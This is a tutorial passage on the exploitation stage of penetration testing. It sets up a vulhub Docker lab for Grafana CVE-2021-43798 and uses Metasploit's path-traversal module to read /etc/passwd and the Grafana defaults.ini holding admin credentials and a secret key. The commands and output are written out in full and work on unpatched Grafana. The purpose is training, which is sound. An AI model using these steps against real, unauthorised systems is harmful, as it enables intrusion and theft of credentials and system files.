## Exploitation
Now we are moving to a more interesting topic after we found out the vulnerability we need to prove it to make sure that it can be presented to the client.
Most of the time to do exploitation in infrastructure, we used tool like Metasploit. What is metasploit? it is a tool that contain all of commonly public payload and exploit that we can use to simulate real attack to our target.

### Reminder
If you at this stage, I suggest you check your docker network adapter as it may will piled up. You can remove the adapter by doing this in your kali linux terminal:
```
~# sudo docker network ls
NETWORK ID     NAME                                  DRIVER    SCOPE
cfe7f97695be   bridge                                bridge    local
145b77ffa341   emqx-default-login_default            bridge    local
3c76bc717ebc   host                                  host      local
27185d508568   none                                  null      local
e28e226f1ea4   phpmyadmin-misconfiguration_default   bridge    local

```
This will list all available network that has been setup from your previous lab, lets delete emqx and phpmyadmin like this:
```
~# sudo docker network rm 145b77ffa341 e28e226f1ea4
145b77ffa341
e28e226f1ea4

```
This will delete the network adapter, you can put as many network id you want in the parameter.
 
### Get your hands dirty
The lab that we will used is from https://github.com/vulhub/vulhub.git
Shout out to the author of repository this is really cool!

```
~# git clone https://github.com/vulhub/vulhub.git
```
Now go to grafana folder which located at vulhub/grafana/CVE-2021-43798. If you don't know about grafana basically a dashboard for monitoring anything like metric and visualize it into to a neat diagram.
Once inside the folder run the following command:
```
~# sudo docker compose up
WARN[0000] /home/kali/Documents/vulhub/grafana/CVE-2021-43798/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 10/10
 ✔ web Pulled                                                                                                   25.1s 
   ✔ 97518928ae5f Pull complete                                                                                  1.3s 
   ✔ 5aba0f6bfd98 Pull complete                                                                                  1.6s 
   ✔ 3694b5a562ee Pull complete                                                                                  1.8s 
   ✔ bff44df695f9 Pull complete                                                                                  3.1s 
   ✔ 24c1ec8cf9df Pull complete                                                                                  4.9s 
   ✔ 17fd2cee9f08 Pull complete                                                                                 15.1s 
   ✔ 4f4fb700ef54 Pull complete                                                                                  4.3s 
   ✔ dc3505db7303 Pull complete                                                                                  7.3s 
   ✔ 046f9a37e741 Pull complete                                                                                  8.1s 
[+] Running 1/2
 ✔ Network cve-2021-43798_default  Created                                                                       0.1s 
 ⠹ Container cve-2021-43798-web-1  Created                                                                       0.2s 
Attaching to web-1
web-1  | t=2025-08-14T10:43:59+0000 lvl=warn msg="falling back to legacy setting of 'min_interval_seconds'; please use the configuration option in the `unified_alerting` section if Grafana 8 alerts are enabled." logger=settings
```
Once its running try to enter docker and find out the ip address, like this:
```
~# sudo docker container ls -all
CONTAINER ID   IMAGE                  COMMAND     CREATED              STATUS              PORTS                                       NAMES
eca20f3050c3   vulhub/grafana:8.2.6   "/run.sh"   About a minute ago   Up About a minute   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp   cve-2021-43798-web-1

~# sudo docker exec -it eca20f3050c3 /bin/bash
bash-5.1$ whoami
grafana
bash-5.1$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:02  
          inet addr:172.20.0.2  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:59 errors:0 dropped:0 overruns:0 frame:0
          TX packets:43 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:15016 (14.6 KiB)  TX bytes:3772 (3.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:732 (732.0 B)  TX bytes:732 (732.0 B)

bash-5.1$ exit
exit

```
Next step is to run msfconsole. Msfconsole is part of metasploit, metasploit is penetration testing platform that allows you to write, test, and execute exploit code. 
You can run metasploit by running this command in different tab in terminal:
```
~# msfconsole
```
Just wait couple of minute for msfconsole to start, you may experience a spike in the utilization but no worries it will be soon go down. Msfconsole operate via command line so you need to kinda memorize its instruction.
For starter lets run the following command in metasploit console:
```
msf6> search grafana
                                                                                                                                 
Matching Modules                                                                                                                              
================                                                                                                                              
                                                                                                                                              
   #  Name                                             Disclosure Date  Rank    Check  Description                                                    
   -  ----                                             ---------------  ----    -----  -----------                                                            
   0  auxiliary/admin/http/grafana_auth_bypass         2019-08-14       normal  No     Grafana 2.0 through 5.2.2 authentication bypass for LDAP and OAuth     
   1  auxiliary/scanner/http/grafana_plugin_traversal  2021-12-02       normal  No     Grafana Plugin Path Traversal                                          
                                                                                                                                                              

Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/grafana_plugin_traversal

```
This will show a list of module that can be used to attack grafana and we have two modules. We are going to use auxiliary/scanner/http/grafana_plugin_traversal, why? try to run the following command:
```
msf6 > use auxiliary/scanner/http/grafana_plugin_traversal
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > show info

       Name: Grafana Plugin Path Traversal
     Module: auxiliary/scanner/http/grafana_plugin_traversal
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2021-12-02

Provided by:
  h00die
  jordyv

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Check supported:
  No

Basic options:
  Name          Current Setting                                Required  Description
  ----          ---------------                                --------  -----------
  DEPTH         13                                             yes       Traversal depth
  FILEPATH      /usr/share/grafana/conf/defaults.ini           yes       The name of the file to download
  PLUGINS_FILE  /usr/share/metasploit-framework/data/wordlist  yes       File containing plugins to enumerate
                s/grafana_plugins.txt
  Proxies                                                      no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS        	                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                                                         ing-metasploit.html
  RPORT         3000                                           yes       The target port (TCP)
  SSL           false                                          no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /                                              yes       Path to Grafana instance
  THREADS       1                                              yes       The number of concurrent threads (max one per host)
  VHOST                                                        no        HTTP server virtual host

Description:
  Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal
  through the plugin URL.  A valid plugin ID is required, but many are installed by default.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-43798
  https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
  https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
  https://www.exploit-db.com/exploits/50581
  https://github.com/jas502n/Grafana-CVE-2021-43798
  https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce
  https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/


View the full module info with the info -d command.
```
The above command will do the following task:
1. First is to load module so we can use it
2. We show the details of the module, this means it will show options that need to be adjusted, descriptions and references related to the module. If you take a look at references, you can see a lot of them is pointing to the same CVE as the one in our current local vulhub github folder when we run docker-compose up. 

To use the module you can take a look at "Basic options" section this shows what parameters you need to be adjusted and you don't have to adjusted every parameter as a rule of thumb set parameter for parameter that has required yes but the current setting is empty. Which in this case will be RHOSTS. As the description show this parameter hold the ip address of our target which my case the docker ip address 172.20.0.2 and we don't have to change the target port since its the same with our target.
To set the RHOSTS parameter run the following command in metasploit console:

```
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > set RHOSTS 172.20.0.2
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > set FILEPATH /etc/passwd
```
The second command will be used as a testing file, we will try using the exploit to retrieve /etc/passwd file inside the target docker. This is not mandatory but rather as a testing mechanism because /etc/passwd will always be available in every linux distribution.
```
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > run
[+] Detected vulnerable Grafana: 8.2.6
[*] 172.20.0.2 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 172.20.0.2:3000 - File saved in: /home/kali/.msf4/loot/20250814232603_default_172.20.0.2_grafana.loot_972971.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > cat /home/kali/.msf4/loot/20250814232603_default_172.20.0.2_grafana.loot_972971.bin
[*] exec: cat /home/kali/.msf4/loot/20250814232603_default_172.20.0.2_grafana.loot_972971.bin

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```
Running run in the console will execute the exploit and the result of the file that we have been stolen is in /home/kali/.msf4/loot/20250814232603_default_172.20.0.2_grafana.loot_972971.bin. Again you will have different file name please be careful compare to mine.
Okay! so we know that we could use this exploit to stole a file inside target machine, the next question will be what file should I steal in order to elevate this exploit, we can target the grafana local configuration that contain the username and password of the dashboard.

```
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > set FILEPATH /usr/share/grafana/conf/defaults.ini
FILEPATH => /usr/share/grafana/conf/defaults.ini
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > run
[+] Detected vulnerable Grafana: 8.2.6
[*] 172.20.0.2 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 172.20.0.2:3000 - File saved in: /home/kali/.msf4/loot/20250814233429_default_172.20.0.2_grafana.loot_075594.ini
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Set filepath like the above configuration. How do you know thats gonna be the right path? read the documentation!  
```
admin_user = admin
admin_password = admin
secret_key = SW2YcwTIb9zpOOhoPsMm
```
With the defaults.ini has been retrieved we can look at the contents and we found the admin username and password. You can try to use this credential to login into the grafana.

